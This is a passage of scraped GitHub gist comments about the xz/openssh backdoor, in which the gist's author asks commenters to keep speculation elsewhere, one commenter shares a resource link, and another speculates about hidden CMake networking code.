    <path d="M1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25v-8.5C0 2.784.784 2 1.75 2ZM1.5 12.251c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V5.809L8.38 9.397a.75.75 0 0 1-.76 0L1.5 5.809v6.442Zm13-8.181v-.32a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25v.32L8 7.88Z"></path>
</svg>

      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block email-format">
      <div class="email-fragment">Wouldn't a forum of computer nerds who actually understand what he did be
the perfect place for theorizing?</div>
<span class="email-hidden-toggle"><a href="#">…</a></span><div class="email-hidden-reply">
<div class="email-quoted-reply">On Sun, Apr 14, 2024 at 6:21 PM Adrian Bunk ***@***.***&gt; wrote:
 ***@***.**** commented on this gist.
 ------------------------------

 I joint this discussion just by pointing out that the ultimate target for
 a supply chain attack will be the kernel.

 That's nonsense.

 Nothing you provided indicates that there was actually anything malicious
 submitted to the kernel, and it would be unbelievably stupid for the
 attacker to try to add more exploits since this would increase the risk
 that the openssh backdoor gets detected.

 The openssh backdoor would have given the attacker remote administrator
 access to most Linux servers on the internet.
 This is already the ultimate backdoor.

 And here is not the right place for people to present whatever thoughts or
 theories they come up with, please do that in a more appropriate location.

 —
 Reply to this email directly, view it on GitHub
 &lt;<a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#gistcomment-5023235">https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#gistcomment-5023235</a>&gt;
 or unsubscribe
 &lt;<a href="https://github.com/notifications/unsubscribe-auth/A36TWFCA4PIT7AXM2PFZMUTY5MFQLBFKMF2HI4TJMJ2XIZLTSKBKK5TBNR2WLJDUOJ2WLJDOMFWWLO3UNBZGKYLEL5YGC4TUNFRWS4DBNZ2F6YLDORUXM2LUPGBKK5TBNR2WLJDHNFZXJJDOMFWWLK3UNBZGKYLEL52HS4DFVRZXKYTKMVRXIX3UPFYGLK2HNFZXIQ3PNVWWK3TUUZ2G64DJMNZZDAVEOR4XAZNEM5UXG5FFOZQWY5LFVEYTEOJTGU4DQNBWU52HE2LHM5SXFJTDOJSWC5DF">https://github.com/notifications/unsubscribe-auth/A36TWFCA4PIT7AXM2PFZMUTY5MFQLBFKMF2HI4TJMJ2XIZLTSKBKK5TBNR2WLJDUOJ2WLJDOMFWWLO3UNBZGKYLEL5YGC4TUNFRWS4DBNZ2F6YLDORUXM2LUPGBKK5TBNR2WLJDHNFZXJJDOMFWWLK3UNBZGKYLEL52HS4DFVRZXKYTKMVRXIX3UPFYGLK2HNFZXIQ3PNVWWK3TUUZ2G64DJMNZZDAVEOR4XAZNEM5UXG5FFOZQWY5LFVEYTEOJTGU4DQNBWU52HE2LHM5SXFJTDOJSWC5DF</a>&gt;
 .
 You are receiving this email because you commented on the thread.

 Triage notifications on the go with GitHub Mobile for iOS
 &lt;<a href="https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&amp;mt=8&amp;pt=524675">https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&amp;mt=8&amp;pt=524675</a>&gt;
 or Android
 &lt;<a href="https://play.google.com/store/apps/details?id=com.github.android&amp;referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub">https://play.google.com/store/apps/details?id=com.github.android&amp;referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub</a>&gt;
 .

</div>
<div class="email-fragment"></div>
</div>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023281" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="LkxVRkIxXfGFdmMELAsscQYt2g8fO-Jfz7S6ExrzXhR7Eb79cdmsnMYBzu-cEfOwyHm5_FZr77AspWRzhWfpTQ" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023281/edit_form?textarea_id=gistcomment-5023281-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/11667869?s=80&amp;v=4" width="40" height="40" alt="@thesamesam" /></a>
    </div>
    <div id="gistcomment-5023292" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5023292-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      
<span aria-label="This user is the author of this ." data-view-component="true" class="tooltipped tooltipped-n">
  <span data-view-component="true" class="Label ml-1">Author</span>
</span>

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam">thesamesam</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023292#gistcomment-5023292" id="gistcomment-5023292-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-15T01:39:06Z" class="no-wrap">Apr 15, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">It makes my life a lot easier if the comment section here is kept for editorial changes I need to make, extra sources, etc.</p>
<p dir="auto">Please keep theorising to other forums. Thanks!</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023292" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="F5hokhL9EDlS8sCGfQpdHUKOEUKjkpi6Z5wV93Dm1fPNLem-UhKLWXbMYXqe5DeoSHg6a0WzgCKxdlBkaQjeBw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023292/edit_form?textarea_id=gistcomment-5023292-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/felipec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/felipec"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/8358?s=80&amp;v=4" width="40" height="40" alt="@felipec" /></a>
    </div>
    <div id="gistcomment-5024238" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5024238-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/felipec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/felipec">felipec</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5024238#gistcomment-5024238" id="gistcomment-5024238-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-15T18:49:27Z" class="no-wrap">Apr 15, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/thesamesam">@thesamesam</a> this is a good resource I think: <a href="https://github.com/felipec/xz-min">https://github.com/felipec/xz-min</a>.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5024238" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="zrUC7NCe6le3k914PsJY_05ZeZb7vQjfVNsNBeLCojnap-hgP9M9JoIvUlJdqtut13sE5c0boUh6pVbIJMYqhA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5024238/edit_form?textarea_id=gistcomment-5024238-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/11667869?s=80&amp;v=4" width="40" height="40" alt="@thesamesam" /></a>
    </div>
    <div id="gistcomment-5024729" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5024729-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      
<span aria-label="This user is the author of this ." data-view-component="true" class="tooltipped tooltipped-n">
  <span data-view-component="true" class="Label ml-1">Author</span>
</span>

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam">thesamesam</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5024729#gistcomment-5024729" id="gistcomment-5024729-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-16T03:17:56Z" class="no-wrap">Apr 16, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">Thanks <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/felipec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/felipec">@felipec</a>! I have a few other things to go over in the backlog and can hopefully include them all in a batch later today or tomorrow.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5024729" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="3J_oFd6TU13QYpm4Z-zQURPO8glI_BVXcmtPhPVlOhHm1Bntj0Kv9S77onU6YPseuvJvOelrLGp4uTq9M_j_6A" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5024729/edit_form?textarea_id=gistcomment-5024729-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/dnorthup-ums/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/dnorthup-ums"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/18331571?s=80&amp;v=4" width="40" height="40" alt="@dnorthup-ums" /></a>
    </div>
    <div id="gistcomment-5025558" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5025558-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/dnorthup-ums/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/dnorthup-ums">dnorthup-ums</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5025558#gistcomment-5025558" id="gistcomment-5025558-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-16T14:00:47Z" class="no-wrap">Apr 16, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/thesamesam">@thesamesam</a><br>
Sam, et al:<br>
I think there's another "Easter Egg" in there... Looking again, closely, at Lasse's f9cf4c05 commit (the tukaani repo) and his 02e35059 commit, and then re-reading the build tools scripts, it looks like "Jia" intended to be able to use TCP connections from inside of XZ on platforms built with CMAKE. There's got to be some way to invoke that. Perhaps he hadn't finished implementing that part yet..., but I think that somebody with better fuzzing skills than mine should give it a close look. The good news is that Lasse re-enabled the Landlock function for CMAKE builds...., presuming that "Jia" hadn't hidden something in the Landlock code.</p>
</blockquote>
<p dir="auto">Since there's apparently zero interest, here or elsewhere, about following up on "Jia"'s fairly obvious attempt to weaponize the cmake builds, I'm outta here. I'm not hard to find should anybody not manage to make sense of what I said earlier, but I'm not bothering to follow the conversation here anymore.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5025558" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="tAHgAbZP0ujb5n_rn8u9qeJwXEsLEStxH_mheezUlR1mWvBOb6RKKZkYxow4kCBMJmbIjrrW4_HNuW2rJmCJIw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5025558/edit_form?textarea_id=gistcomment-5025558-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/11667869?s=80&amp;v=4" width="40" height="40" alt="@thesamesam" /></a>
    </div>
    <div id="gistcomment-5027809" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5027809-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      
<span aria-label="This user is the author of this ." data-view-component="true" class="tooltipped tooltipped-n">
  <span data-view-component="true" class="Label ml-1">Author</span>
</span>

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam">thesamesam</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5027809#gistcomment-5027809" id="gistcomment-5027809-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-18T04:54:35Z" class="no-wrap">Apr 18, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
